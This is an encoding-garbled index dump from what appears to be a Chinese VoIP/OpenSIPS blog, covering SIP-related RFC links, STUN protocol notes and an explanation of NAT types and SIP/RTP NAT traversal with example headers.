https://tools.ietf.org/html/rfc2663 IP Network Address Translator (NAT) Terminology and Considerations https://tools.ietf.org/html/rfc3605 Real Time Control Protocol (RTCP) attribute in Session Description Protocol (SDP) https://tools.ietf.org/html/rfc3711 The Secure Real-time Transport Protocol (SRTP) https://tools.ietf.org/html/rfc4568 Session Description Protocol (SDP) Security Descriptions for Media Streams https://tools.ietf.org/html/rfc4585 Extended RTP Profile for Real-time Transport Control Protocol (RTCP)-Based Feedback (RTP/AVPF) https://tools.ietf.org/html/rfc5124 Extended Secure RTP Profile for Real-time Transport Control Protocol (RTCP)-Based Feedback (RTP/SAVPF) https://tools.ietf.org/html/rfc5245 Interactive Connectivity Establishment (ICE): A Protocol for Network Address Translator (NAT) Traversal for Offer/Answer Protocols https://tools.ietf.org/html/rfc5626 Managing Client-Initiated Connections in the Session Initiation Protocol (SIP) https://tools.ietf.org/html/rfc5761 Multiplexing RTP Data and Control Packets on a Single Port https://tools.ietf.org/html/rfc5764 Datagram Transport Layer Security (DTLS) Extension to Establish Keys for the Secure Real-time Transport Protocol (SRTP) ","permalink":"https://wdd.js.org/opensips/ch1/sip-rfcs/","summary":"RFC åç§° https://tools.ietf.org/html/rfc3261 SIP: Session Initiation Protocol https://tools.ietf.org/html/rfc3665 Session Initiation Protocol (SIP) Basic Call Flow Examples https://tools.ietf.org/html/rfc6141 Re-INVITE and Target-Refresh Request Handling in the Session Initiation Protocol (SIP) https://tools.ietf.org/html/rfc4566 SDP: Session Description Protocol https://tools.ietf.org/html/rfc4028 Session Timers in the Session Initiation Protocol (SIP) https://tools.ietf.org/html/rfc1889 RTP: A Transport Protocol for Real-Time Applications https://tools.ietf.org/html/rfc2326 Real Time Streaming Protocol (RTSP) https://tools.ietf.org/html/rfc2327 SDP: Session Description Protocol https://tools.ietf.org/html/rfc3015 Megaco Protocol Version 1.0 https://tools.ietf.org/html/rfc1918 Address Allocation for Private Internets https://tools.","title":"SIPç›¸å…³RFCåè®®"},{"content":" title: \u0026ldquo;STUNåè®®ç¬”è®°\u0026rdquo; date: \u0026ldquo;2022-01-06 17:54:10\u0026rdquo; draft: false STUNæ˜¯Simple Traversal of User Datagram Protocol (UDP) through Network Address Translators (NATâ€™s)çš„ç¼©å†™ ä¼ è¾“å±‚åº•å±‚ç”¨çš„æ˜¯UDP ä¸»è¦ç”¨æ¥NATç©¿é€ ä¸»è¦ç”¨æ¥è§£å†³voipé¢†åŸŸçš„å•æ–¹å‘é€šè¯(one-way)çš„é—®é¢˜ ç›®çš„æ˜¯è®©NATåé¢çš„è®¾å¤‡èƒ½å‘ç°è‡ªå·±çš„å…¬ç½‘IPä»¥åŠNATçš„ç±»å‹ è®©å¤–éƒ¨è®¾å¤‡èƒ½å¤Ÿæ‰¾åˆ°åˆé€‚çš„ç«¯å£å’Œå†…éƒ¨è®¾å¤‡é€šä¿¡ åˆ·æ–°NATç»‘å®šï¼Œç±»ä¼¼keep-aliveæœºåˆ¶ã€‚å¦åˆ™ç«¯å£æ˜ å°„å¯èƒ½å› ä¸ºè¶…æ—¶è¢«é‡Šæ”¾ STUNæ˜¯csæ¶æ„çš„åè®® å®¢æˆ·ç«¯ç«¯192.168.1.3ï¼Œä½¿ç”¨5060ç«¯å£ï¼Œå‘é€stunè¯·æ±‚åˆ° 64.25.58.65ï¼Œ ç»è¿‡äº†192.168.1.1çš„ç½‘å…³ä¹‹å ç½‘å…³å°†æºipæ”¹ä¸º212.128.56.125ï¼Œ ç«¯å£æ”¹ä¸º15050 stunæœåŠ¡å™¨å°†è¯·æ±‚å‘é€åˆ° ç½‘å…³çš„å¤–ç½‘ç«¯å£15050ï¼Œç„¶åç½‘å…³å°†è¯·æ±‚è½¬å‘ç»™192.168.1.3:5060 stun message type which typically is one of the below: - 0x0001 : Binding Request - 0x0101 : Binding Response\n0x0111 : Binding Error Response 0x0002 : Shared Secret Request 0x0102 : Shared Secret Response 0x0112 : Shared Secret Error Response **0x0001: MAPPED-ADDRESS - **This attribute contains an IP address and port. It is always placed in the Binding Response, and it indicates the source IP address and port the server saw in the Binding Request sent from the client, i.e.; the STUN clientâ€™s public IP address and port where it can be reached from the internet.\n0x0002: RESPONSE-ADDRESS - This attribute contains an IP address and port and is an optional attribute, typically in the Binding Request (sent from the STUN client to the STUN server). It indicates where the Binding Response (sent from the STUN server to the STUN client) is to be sent. If this attribute is not present in the Binding Request, the Binding Response is sent to the source IP address and port of the Binding Request which is attribute 0x0001: MAPPED-ADDRESS.\n0x0003: CHANGE-REQUEST - This attribute, which is only allowed in the Binding Request and optional, contains two flags; to control the IP address and port used to send the response. These flags are called \u0026ldquo;change IP\u0026rdquo; and \u0026ldquo;change Port\u0026rdquo; flags. The \u0026ldquo;change IP\u0026rdquo; and \u0026ldquo;change Port\u0026rdquo; flags are useful for determining whether the client is behind a restricted cone NAT or restricted port cone NAT. They instruct the server to send the Binding Responses from a different source IP address and port.\n**0x0004: SOURCE-ADDRESS - **This attribute is usually present in Binding Responses; it indicates the source IP address and port where the response was sent from, i.e. the IP address of the machine the client is running on (typically an internal private IP address). It is very useful as from this attribute the STUN server can detect twice NAT configurations.\n**0x0005: CHANGED-ADDRESS - **This attribute is usually present in Binding Responses; it informs the client of the source IP address and port that would be used if the client requested the \u0026ldquo;change IP\u0026rdquo; and \u0026ldquo;change port\u0026rdquo; behaviour.\n0x0006: USERNAME - This attribute is optional and is present in a Shared Secret Response with the PASSWORD attribute. It serves as a means to identify the shared secret used in the message integrity check.\n0x0007: PASSWORD - This attribute is optional and only present in Shared Secret Response along with the USERNAME attribute. The value of the PASSWORD attribute is of variable length and used as a shared secret between the STUN server and the STUN client.\n0x0008: MESSAGE-INTEGRITY - This attribute must be the last attribute in a STUN message and can be present in both Binding Request and Binding Response. It contains HMAC-SHA1 of the STUN message.\n**0x0009: ERROR-CODE - **This attribute is present in the Binding Error Response and Shared Secret Error Response only. It indicates that an error has occurred and indicates also the type of error which has occurred. It contains a numerical value in the range of 100 to 699; which is the error code and also a textual reason phrase encoded in UTF-8 describing the error code, which is meant for the client.\n0x000a: UNKNOWN-ATTRIBUTES - This attribute is present in the Binding Error Response or Shared Secret Error response when the error code is 420; some attributes sent from the client in the Request are unknown and the server does not understand them.\n0x000b: REFLECTED-FROM - This attribute is present only in Binding Response and its use is to provide traceability so the STUN server cannot be used as part of a denial of service attack. It contains the IP address of the source from where the request came from, i.e. the IP address of the STUN client.\nCommon STUN Server error codes Like many other protocols, the STUN protocol has a list of error codes. STUN protocol error codes are similar to those of HTTP or SIP. Below is a list of most common error codes encountered when using the STUN protocol. For a complete list of STUN protocol error codes refer to the STUN RFC 3489.\nError Code 400 - Bad request; the request was malformed. Client must modify request and try sending it again. Error Code 420 - Unknown attribute; the server did not understand an attribute in the request. Error Code 430 - Stale credentials; the shared secret sent in the request is expired; the client should obtain a new shared secret. Error Code 432 - Missing username; the username attribute is not present in the request. Error Code 500 - Server error; temporary error and the client should try to send the request again. ä¸‹å›¾æ˜¯ä¸€ä¸ªwebrtcå‘¼å«çš„æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨å‘¼å«å»ºç«‹å‰çš„é˜¶æ®µã€‚æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½ç›¸äº’å‘é€äº†Binding Requestå’Œå“åº”äº†Bind Responseã€‚\nå¹¶ä¸”åœ¨é€šè¯è¿‡ç¨‹ä¸­ï¼Œè¿˜ä¼šæœ‰æŒç»­çš„binding reqeust, å¹¶ä¸”åœ¨æŸäº›æ—¶å€™ï¼Œæºç«¯å£å¯èƒ½ä¼šå˜ã€‚è¯´æ˜åª’ä½“å‘é€çš„ç«¯å£ä¹Ÿå·²ç»å‘ç”Ÿäº†æ”¹å˜ã€‚\nå¦‚æœbinding request è¯·æ±‚æ²¡æœ‰å“åº”ï¼Œé‚£ä¹ˆè¯­éŸ³å¾ˆå¯ä»¥ä¹Ÿä¼šæ–­ï¼Œä»è€Œå¯¼è‡´äº†å‘¼å«æŒ‚æ–­ã€‚\nå‚è€ƒ https://www.3cx.com/blog/voip-howto/stun/ https://www.3cx.com/blog/voip-howto/stun-voip-1/ https://www.3cx.com/blog/voip-howto/stun-protocol/ https://www.3cx.com/blog/voip-howto/stun-details/ ","permalink":"https://wdd.js.org/opensips/ch1/stun-notes/","summary":"title: \u0026ldquo;STUNåè®®ç¬”è®°\u0026rdquo; date: \u0026ldquo;2022-01-06 17:54:10\u0026rdquo; draft: false STUNæ˜¯Simple Traversal of User Datagram Protocol (UDP) through Network Address Translators (NATâ€™s)çš„ç¼©å†™ ä¼ è¾“å±‚åº•å±‚ç”¨çš„æ˜¯UDP ä¸»è¦ç”¨æ¥NATç©¿é€ ä¸»è¦ç”¨æ¥è§£å†³voipé¢†åŸŸçš„å•æ–¹å‘é€šè¯(one-way)çš„é—®é¢˜ ç›®çš„æ˜¯è®©NATåé¢çš„è®¾å¤‡èƒ½å‘ç°è‡ªå·±çš„å…¬ç½‘IPä»¥åŠNATçš„ç±»å‹ è®©å¤–éƒ¨è®¾å¤‡èƒ½å¤Ÿæ‰¾åˆ°åˆé€‚çš„ç«¯å£å’Œå†…éƒ¨è®¾å¤‡é€šä¿¡ åˆ·æ–°NATç»‘å®šï¼Œç±»ä¼¼keep-aliveæœºåˆ¶ã€‚å¦åˆ™ç«¯å£æ˜ å°„å¯èƒ½å› ä¸ºè¶…æ—¶è¢«é‡Šæ”¾ STUNæ˜¯csæ¶æ„çš„åè®® å®¢æˆ·ç«¯ç«¯192.168.1.3ï¼Œä½¿ç”¨5060ç«¯å£ï¼Œå‘é€stunè¯·æ±‚åˆ° 64.25.58.65ï¼Œ ç»è¿‡äº†192.168.1.1çš„ç½‘å…³ä¹‹å ç½‘å…³å°†æºipæ”¹ä¸º212.128.56.125ï¼Œ ç«¯å£æ”¹ä¸º15050 stunæœåŠ¡å™¨å°†è¯·æ±‚å‘é€åˆ° ç½‘å…³çš„å¤–ç½‘ç«¯å£15050ï¼Œç„¶åç½‘å…³å°†è¯·æ±‚è½¬å‘ç»™192.168.1.3:5060 stun message type which typically is one of the below: - 0x0001 : Binding Request - 0x0101 : Binding Response\n0x0111 : Binding Error Response 0x0002 : Shared Secret Request 0x0102 : Shared Secret Response 0x0112 : Shared Secret Error Response **0x0001: MAPPED-ADDRESS - **This attribute contains an IP address and port.","title":"STUNåè®®ç¬”è®°"},{"content":"ä»€ä¹ˆæ˜¯NAT? NAT(ç½‘ç»œåœ°å€è½¬æ¢)ï¼Œ å…·ä½“å¯ä»¥å‚è€ƒç™¾ç§‘ https://baike.baidu.com/item/nat/320024ã€‚\nNATæ˜¯ç”¨æ¥è§£å†³IPv4çš„åœ°å€ä¸å¤Ÿçš„é—®é¢˜ã€‚\nä¾‹å¦‚ä¸Šå›¾ï¼Œå†…ç½‘çš„ä¸»æœºï¼Œåœ¨è®¿é—®å¤–ç½‘æ—¶ï¼Œæº192.168çš„ç½‘å€ï¼Œä¼šè¢«æ”¹å†™æˆ1.2.3.4ã€‚æ‰€ä»¥åœ¨serverç«¯çœ‹æ¥ï¼Œè¯·æ±‚æ˜¯ä»1.2.3.4å‘é€è¿‡æ¥çš„ã€‚\nNATä¸€èˆ¬ä¼šæ”¹å†™è¯·æ±‚çš„æºIPåŒ…çš„æºIPåœ°å€ï¼Œä¹Ÿå¯èƒ½ä¼šæ”¹å†™tcpæˆ–è€…udpçš„æºç«¯å£åœ°å€ã€‚\nNATåœ°å€èŒƒå›´ äº’è”ç½‘åœ°å€åˆ†é…æœºæ„ä¿ç•™äº†ä¸‰ç±»ç½‘å€åªèƒ½ç”±äºç§æœ‰åœ°å€ï¼Œè¿™äº›åœ°å€åªèƒ½ç”±äºNATå†…éƒ¨ï¼Œä¸èƒ½ç”¨äºå…¬ç½‘ã€‚\nå¦‚æœåœ¨sipæ¶ˆæ¯ä¸­ï¼ŒContactå¤´ä¸­çš„åœ°å€æ˜¯192.168å¼€å¤´ï¼Œèªæ˜çš„æœåŠ¡å™¨åº”è¯¥çŸ¥é“ï¼Œè¿™ä¸ªè¯·æ±‚æ¥è‡ªNATå†…éƒ¨ã€‚\n10.0.0.0 - 10.255.255.255 (10/8 prefix) 172.16.0.0 - 172.31.255.255 (172.16/12 prefix) 192.168.0.0 - 192.168.255.255 (192.168/16 prefix) NAT å·¥ä½œåŸç† NATå†…éƒ¨æµé‡æµå‡ºæ—¶ï¼ŒæºIPå’Œæºç«¯å£éƒ½è¢«æ”¹å†™ï¼Œç›®æ ‡åœ°å€å’Œç«¯å£ä¸ä¼šæ”¹å†™ã€‚æºipå’Œç«¯å£ä¸è¢«æ”¹å†™åçš„ipå’Œç«¯å£å­˜åœ¨ä¸€æ®µæ—¶é—´çš„æ˜ å°„å…³ç³»ï¼Œå½“å“åº”å›æ¥æ—¶ï¼Œæ ¹æ®è¿™ä¸ªæ˜ å°„å…³ç³»ï¼ŒNATè®¾å¤‡çŸ¥é“è¿™ä¸ªåŒ…åº”è¯¥å‘ç»™å†…ç½‘çš„å“ªä¸ªè®¾å¤‡ã€‚\nNATåˆ†ç±» é™æ€NAT: æ¯ä¸ªå†…éƒ¨ä¸»æœºéƒ½æ°¸ä¹…æ˜ å°„ä¸€ä¸ªå¤–éƒ¨å…¬ç½‘IP åŠ¨æ€NAT: æ¯ä¸ªå†…éƒ¨ä¸»æœºéƒ½åŠ¨æ€æ˜ å°„ä¸€ä¸ªå¤–éƒ¨å…¬ç½‘IP ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢: å†…éƒ¨ä¸»æœºæ˜ å°„åˆ°å¤–éƒ¨ä¸åŒç«¯å£ä¸Š ç”±äºé™æ€NATå’ŒåŠ¨æ€NATå¹¶ä¸èƒ½èŠ‚çœå…¬ç½‘IP,Â å¸¸ç”¨çš„éƒ½æ˜¯ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢ï¼Œå³NAPTã€‚\nNAPT ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢åˆ†ç±» å…¨é”¥å‹NATÂ é™åˆ¶é”¥å‹NATï¼š é™åˆ¶ä¸»æœº ç«¯å£é™åˆ¶NATï¼šé™åˆ¶ä¸»æœºå’Œç«¯å£ Full Cone NAT å…¨é”¥å‹NATÂ æ‰“æ´è¿‡ç¨‹\næ¥è‡ªnatå†…éƒ¨ip1:port1åœ°å€åœ¨ç»è¿‡è·¯ç”±å™¨æ—¶ï¼Œè·¯ç”±å™¨ä¼šæ‰“æ´ip1\u0026rsquo;:port1' ä»»ä½•æœåŠ¡å™¨åªè¦æŠŠåŒ…å‘åˆ°ip1\u0026rsquo;:port1\u0026rsquo;ï¼Œè·¯ç”±å™¨éƒ½ä¼šæŠŠè¿™ä¸ªåŒ…å‘åˆ°ip1:port1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿åˆšå¼€å§‹æ‰“æ´çš„åŒ…æ˜¯å‘ç»™server1çš„ï¼Œå¦‚æœserver2çŸ¥é“è¿™ä¸ªæ´çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆserver2ä¹Ÿå¯ä»¥é€šè¿‡è¿™æ´ï¼Œå°†æ¶ˆæ¯å‘ç»™ip1:port1 Restricted Cone NAT é™åˆ¶é”¥å‹NAT é™åˆ¶é”¥å‹æ‰“æ´è¿‡ç¨‹å’Œå…¨é”¥å‹å·®ä¸å¤šï¼Œåªä¸è¿‡å¢åŠ äº†é™åˆ¶ã€‚\nå¦‚æœå†…éƒ¨ä¸»æœºæ˜¯æŠŠåŒ…å‘åˆ°server1çš„ï¼Œå³ä½¿server2çŸ¥é“æ‰“æ´çš„ä¿¡æ¯ï¼Œå®ƒå‘çš„åŒ…ä¹Ÿä¸ä¼šè¢«è½¬ç»™å†…éƒ¨ä¸»æœºã€‚ Port Restricted Cone NAT ç«¯å£é™åˆ¶NAT ç«¯å£é™åˆ¶NATè¦æ¯”ä¸Šè¿°ä¸¤ç§NATçš„é™åˆ¶æ›´ä¸ºä¸¥æ ¼\nå†…éƒ¨ä¸»æœºå¦‚æœå°†æ¶ˆæ¯å‘åˆ°server1çš„5080ç«¯å£ï¼Œé‚£ä¹ˆè¿™ä¸ªç«¯å£åªå…è®¸server1çš„5080ç«¯å£å‘æ¶ˆæ¯å›æ¥ server1çš„å…¶ä»–ç«¯å£å‘æ¶ˆæ¯åˆ°è¿™ä¸ªæ´éƒ½ä¼šè¢«æ‹’ç» SIPä¿¡ä»¤NATç©¿è¶Š NATå†…éƒ¨æ¶ˆæ¯å‘åˆ°fsæ—¶ï¼Œä¼šæºå¸¦å¦‚ä¸‹ä¿¡æ¯ã€‚å‡å¦‚fså¯¹NATä¸€æ— æ‰€çŸ¥ï¼Œå¦‚æœåç»­æœ‰å‘¼å«ï¼Œfsæ˜¯æ— æ³•å°†æ¶ˆæ¯å‘åˆ°192.168.0.102çš„ï¼Œå› ä¸º192.168.0.102æ˜¯å†…ç½‘åœ°å€ã€‚\nä½†æ˜¯fsè¶³å¤Ÿèªæ˜ï¼Œå®ƒä¼šä»åˆ†æåŒ…çš„æºipå’Œæºç«¯å£ï¼Œä»è€Œæ­£ç¡®çš„å°†sipæ¶ˆæ¯é€åˆ°NATè®¾å¤‡ä¸Šã€‚\nVia: SIP/2.0/UDP 192.168.1.160:11266;branch=z9hG4bK-d8754z-1f2cd509;rport Contact: \u0026lt;sip:flavio@192.168.1.160:11266\u0026gt; c=IN IP4 192.168.1.160 m=audio 8616 RTP/AVP 0 8 3 101 sipæ¶ˆæ¯å¤´Via, Contactä»¥åŠsdpä¸­çš„c=å’Œm=, å¯èƒ½ä¼šå¸¦æœ‰å†…ç½‘çš„ipå’Œç«¯å£ï¼Œå¦‚æœä¸åŠ ä»¥ç¿»è¯‘å¤„ç†ï¼ŒsipæœåŠ¡å™¨æ˜¯æ— æ³•å°†æ¶ˆæ¯å‘åˆ°è¿™äº›å†…ç½‘åœ°å€ä¸Šçš„ã€‚\nfsä¼šå°†åŸå§‹Contactå¤´å¢åŠ ä¸€äº›ä¿¡æ¯\nContact 1001@192.168.0.102:5060;fs_nat=yes;fs_path:sip:1001@1.2.3.4:23424 RTPæµNATç©¿è¶Š c=IN IP4 192.168.40.79 m=audio 31114 RTP/AVP 0 8 9 101 ä¸€èˆ¬inviteæ¶ˆæ¯æˆ–è€…200okçš„sdpä¸‹éƒ½ä¼šæºå¸¦è¿æ¥ä¿¡æ¯, c=ï¼Œ ä½†æ˜¯è¿™ä¸ªè¿æ¥ä¿¡æ¯å› ä¸ºæ˜¯å†…ç½‘åœ°å€ï¼Œæ‰€ä»¥fså¹¶ä¸ä¼šä½¿ç”¨è¿™ä¸ªä½œä¸ºrtpçš„å¯¹ç«¯åœ°å€ã€‚\nfsä¼šç­‰å¾…NATå†…éƒ¨è®¾å¤‡å‘æ¥çš„ç¬¬ä¸€ä¸ªRTPåŒ…ï¼Œfsä¼šåˆ†æRTPåŒ…ï¼Œæå–å‡ºNATè®¾å¤‡ä¸Šçš„RTPæ´çš„ä¿¡æ¯ï¼Œç„¶åå°†å¦ä¸€æ–¹çš„è¯­éŸ³æµé€åˆ°NATè®¾å¤‡ä¸Šçš„æ´é‡Œã€‚\nå†ç”±NATè®¾å¤‡å°†RTPæµé€åˆ°å¯¹åº”çš„å†…éƒ¨ä¸»æœºã€‚\nNATä¸SIPçš„é—®é¢˜ NATè®¾å¤‡ï¼Œä¾‹å¦‚è·¯ç”±å™¨ï¼Œä¸€èˆ¬å·¥ä½œåœ¨ç½‘ç»œå±‚å’Œä¼ è¾“å±‚ã€‚NATä¼šä¿®æ”¹ç½‘ç»œå±‚çš„IPåœ°å€å’Œä¼ è¾“å±‚çš„ç«¯å£ï¼Œä½†æ˜¯NATä¸ä¼šä¿®æ”¹åŒ…çš„å†…å®¹ã€‚sipæ¶ˆæ¯éƒ½æ˜¯å°è£…åˆ°åŒ…å†…å®¹ä¸­çš„ã€‚\nçœ‹ä¸€ä¸ªINVITEæ¶ˆæ¯ï¼Œå‡ºç°çš„å†…å®¹éƒ½æ˜¯å†…ç½‘ä¸­çš„ï¼Œå½“sipæœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªæ¶ˆæ¯ï¼Œé‚£ä¹ˆå®ƒæ˜¯æ— æ³•å‘å†…ç½‘å‘é€å“åº”ä½“çš„ã€‚\nVia å¤´ä¸­çš„10.1.1.221:5060 c=IN IP4 10.1.1.221 m=audio 49170 RTP/AVP 0 å½“ç„¶ï¼Œæœ‰é—®é¢˜å°±æœ‰è§£å†³æ–¹æ¡ˆ\nreceived æ ‡è®°æ¥æºip rport æ ‡è®°æ¥æºç«¯å£ ä½¿ç”¨è¿™ä¸¤ä¸ªå­—æ®µï¼Œå°±å¯ä»¥å°†æ•°æ®æ­£ç¡®çš„å‘é€åˆ°NATè®¾å¤‡ä¸Š\nINVITE sip:UserB@there.com SIP/2.0 Via: SIP/2.0/UDP 10.1.1.221:5060;branch=z9hG4bKhjh From: TheBigGuy \u0026lt;sip:UserA@customer.com\u0026gt;;tag=343kdw2 To: TheLittleGuy \u0026lt;sip:UserB@there.com\u0026gt; Max-Forwards: 70 Call-ID: 123456349fijoewr CSeq: 1 INVITE Subject: Wow! It Works... Contact: \u0026lt;sip:UserA@10.1.1.221\u0026gt; Content-Type: application/sdp Content-Length: ... v=0 o=UserA 2890844526 2890844526 IN IP4 UserA.customer.coms=- t=0 0 c=IN IP4 10.1.1.221 m=audio 49170 RTP/AVP 0 a=rtpmap:0 PCMU/8000 å‚è€ƒ https://tools.ietf.org/html/rfc1918 ","permalink":"https://wdd.js.org/opensips/ch1/nat-sip-rtp/","summary":"ä»€ä¹ˆæ˜¯NAT? NAT(ç½‘ç»œåœ°å€è½¬æ¢)ï¼Œ å…·ä½“å¯ä»¥å‚è€ƒç™¾ç§‘ https://baike.baidu.com/item/nat/320024ã€‚\nNATæ˜¯ç”¨æ¥è§£å†³IPv4çš„åœ°å€ä¸å¤Ÿçš„é—®é¢˜ã€‚\nä¾‹å¦‚ä¸Šå›¾ï¼Œå†…ç½‘çš„ä¸»æœºï¼Œåœ¨è®¿é—®å¤–ç½‘æ—¶ï¼Œæº192.168çš„ç½‘å€ï¼Œä¼šè¢«æ”¹å†™æˆ1.2.3.4ã€‚æ‰€ä»¥åœ¨serverç«¯çœ‹æ¥ï¼Œè¯·æ±‚æ˜¯ä»1.2.3.4å‘é€è¿‡æ¥çš„ã€‚\nNATä¸€èˆ¬ä¼šæ”¹å†™è¯·æ±‚çš„æºIPåŒ…çš„æºIPåœ°å€ï¼Œä¹Ÿå¯èƒ½ä¼šæ”¹å†™tcpæˆ–è€…udpçš„æºç«¯å£åœ°å€ã€‚\nNATåœ°å€èŒƒå›´ äº’è”ç½‘åœ°å€åˆ†é…æœºæ„ä¿ç•™äº†ä¸‰ç±»ç½‘å€åªèƒ½ç”±äºç§æœ‰åœ°å€ï¼Œè¿™äº›åœ°å€åªèƒ½ç”±äºNATå†…éƒ¨ï¼Œä¸èƒ½ç”¨äºå…¬ç½‘ã€‚\nå¦‚æœåœ¨sipæ¶ˆæ¯ä¸­ï¼ŒContactå¤´ä¸­çš„åœ°å€æ˜¯192.168å¼€å¤´ï¼Œèªæ˜çš„æœåŠ¡å™¨åº”è¯¥çŸ¥é“ï¼Œè¿™ä¸ªè¯·æ±‚æ¥è‡ªNATå†…éƒ¨ã€‚\n10.0.0.0 - 10.255.255.255 (10/8 prefix) 172.16.0.0 - 172.31.255.255 (172.16/12 prefix) 192.168.0.0 - 192.168.255.255 (192.168/16 prefix) NAT å·¥ä½œåŸç† NATå†…éƒ¨æµé‡æµå‡ºæ—¶ï¼ŒæºIPå’Œæºç«¯å£éƒ½è¢«æ”¹å†™ï¼Œç›®æ ‡åœ°å€å’Œç«¯å£ä¸ä¼šæ”¹å†™ã€‚æºipå’Œç«¯å£ä¸è¢«æ”¹å†™åçš„ipå’Œç«¯å£å­˜åœ¨ä¸€æ®µæ—¶é—´çš„æ˜ å°„å…³ç³»ï¼Œå½“å“åº”å›æ¥æ—¶ï¼Œæ ¹æ®è¿™ä¸ªæ˜ å°„å…³ç³»ï¼ŒNATè®¾å¤‡çŸ¥é“è¿™ä¸ªåŒ…åº”è¯¥å‘ç»™å†…ç½‘çš„å“ªä¸ªè®¾å¤‡ã€‚\nNATåˆ†ç±» é™æ€NAT: æ¯ä¸ªå†…éƒ¨ä¸»æœºéƒ½æ°¸ä¹…æ˜ å°„ä¸€ä¸ªå¤–éƒ¨å…¬ç½‘IP åŠ¨æ€NAT: æ¯ä¸ªå†…éƒ¨ä¸»æœºéƒ½åŠ¨æ€æ˜ å°„ä¸€ä¸ªå¤–éƒ¨å…¬ç½‘IP ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢: å†…éƒ¨ä¸»æœºæ˜ å°„åˆ°å¤–éƒ¨ä¸åŒç«¯å£ä¸Š ç”±äºé™æ€NATå’ŒåŠ¨æ€NATå¹¶ä¸èƒ½èŠ‚çœå…¬ç½‘IP,Â å¸¸ç”¨çš„éƒ½æ˜¯ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢ï¼Œå³NAPTã€‚\nNAPT ç½‘ç»œåœ°å€ç«¯å£è½¬æ¢åˆ†ç±» å…¨é”¥å‹NATÂ é™åˆ¶é”¥å‹NATï¼š é™åˆ¶ä¸»æœº ç«¯å£é™åˆ¶NATï¼šé™åˆ¶ä¸»æœºå’Œç«¯å£ Full Cone NAT å…¨é”¥å‹NATÂ æ‰“æ´è¿‡ç¨‹\næ¥è‡ªnatå†…éƒ¨ip1:port1åœ°å€åœ¨ç»è¿‡è·¯ç”±å™¨æ—¶ï¼Œè·¯ç”±å™¨ä¼šæ‰“æ´ip1\u0026rsquo;:port1' ä»»ä½•æœåŠ¡å™¨åªè¦æŠŠåŒ…å‘åˆ°ip1\u0026rsquo;:port1\u0026rsquo;ï¼Œè·¯ç”±å™¨éƒ½ä¼šæŠŠè¿™ä¸ªåŒ…å‘åˆ°ip1:port1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿åˆšå¼€å§‹æ‰“æ´çš„åŒ…æ˜¯å‘ç»™server1çš„ï¼Œå¦‚æœserver2çŸ¥é“è¿™ä¸ªæ´çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆserver2ä¹Ÿå¯ä»¥é€šè¿‡è¿™æ´ï¼Œå°†æ¶ˆæ¯å‘ç»™ip1:port1 Restricted Cone NAT é™åˆ¶é”¥å‹NAT é™åˆ¶é”¥å‹æ‰“æ´è¿‡ç¨‹å’Œå…¨é”¥å‹å·®ä¸å¤šï¼Œåªä¸è¿‡å¢åŠ äº†é™åˆ¶ã€‚\nå¦‚æœå†…éƒ¨ä¸»æœºæ˜¯æŠŠåŒ…å‘åˆ°server1çš„ï¼Œå³ä½¿server2çŸ¥é“æ‰“æ´çš„ä¿¡æ¯ï¼Œå®ƒå‘çš„åŒ…ä¹Ÿä¸ä¼šè¢«è½¬ç»™å†…éƒ¨ä¸»æœºã€‚ Port Restricted Cone NAT ç«¯å£é™åˆ¶NAT ç«¯å£é™åˆ¶NATè¦æ¯”ä¸Šè¿°ä¸¤ç§NATçš„é™åˆ¶æ›´ä¸ºä¸¥æ ¼\nå†…éƒ¨ä¸»æœºå¦‚æœå°†æ¶ˆæ¯å‘åˆ°server1çš„5080ç«¯å£ï¼Œé‚£ä¹ˆè¿™ä¸ªç«¯å£åªå…è®¸server1çš„5080ç«¯å£å‘æ¶ˆæ¯å›æ¥ server1çš„å…¶ä»–ç«¯å£å‘æ¶ˆæ¯åˆ°è¿™ä¸ªæ´éƒ½ä¼šè¢«æ‹’ç» SIPä¿¡ä»¤NATç©¿è¶Š NATå†…éƒ¨æ¶ˆæ¯å‘åˆ°fsæ—¶ï¼Œä¼šæºå¸¦å¦‚ä¸‹ä¿¡æ¯ã€‚å‡å¦‚fså¯¹NATä¸€æ— æ‰€çŸ¥ï¼Œå¦‚æœåç»­æœ‰å‘¼å«ï¼Œfsæ˜¯æ— æ³•å°†æ¶ˆæ¯å‘åˆ°192.168.0.102çš„ï¼Œå› ä¸º192.168.0.102æ˜¯å†…ç½‘åœ°å€ã€‚\nä½†æ˜¯fsè¶³å¤Ÿèªæ˜ï¼Œå®ƒä¼šä»åˆ†æåŒ…çš„æºipå’Œæºç«¯å£ï¼Œä»è€Œæ­£ç¡®çš„å°†sipæ¶ˆæ¯é€åˆ°NATè®¾å¤‡ä¸Šã€‚\nVia: SIP/2.0/UDP 192.168.1.160:11266;branch=z9hG4bK-d8754z-1f2cd509;rport Contact: \u0026lt;sip:flavio@192.","title":"SIPä¿¡ä»¤å’Œåª’ä½“éƒ½ç»•ä¸å¼€çš„NATé—®é¢˜"},{"content":"å‚è€ƒ:Â http://slides.com/gruizdevilla/memory\nå†…å­˜æ˜¯ä¸€å¼ å›¾ åŸå§‹ç±»å‹ï¼Œåªèƒ½ä½œä¸ºå¶å­ã€‚åŸå§‹ç±»å‹ä¸èƒ½å¼•ç”¨å…¶ä»–ç±»å‹ æ•°å­— å­—ç¬¦ä¸² å¸ƒå°”å€¼ é™¤äº†åŸå§‹ç±»å‹ä¹‹å¤–ï¼Œå…¶ä»–ç±»å‹éƒ½æ˜¯å¯¹è±¡ï¼Œå…¶å®å°±æ˜¯é”®å€¼å¯¹ æ•°ç»„æ˜¯ä¸€ç§ç‰¹æ®Šå¯¹è±¡ï¼Œå®ƒçš„é”®æ˜¯è¿ç»­çš„æ•°å­— å†…å­˜ä»æ ¹å¼€å§‹ åœ¨æµè§ˆå™¨ä¸­ï¼Œæ ¹å¯¹è±¡æ˜¯window åœ¨nodejsä¸­ï¼Œæ ¹å¯¹è±¡æ˜¯global ä»»ä½•ä»æ ¹æ— 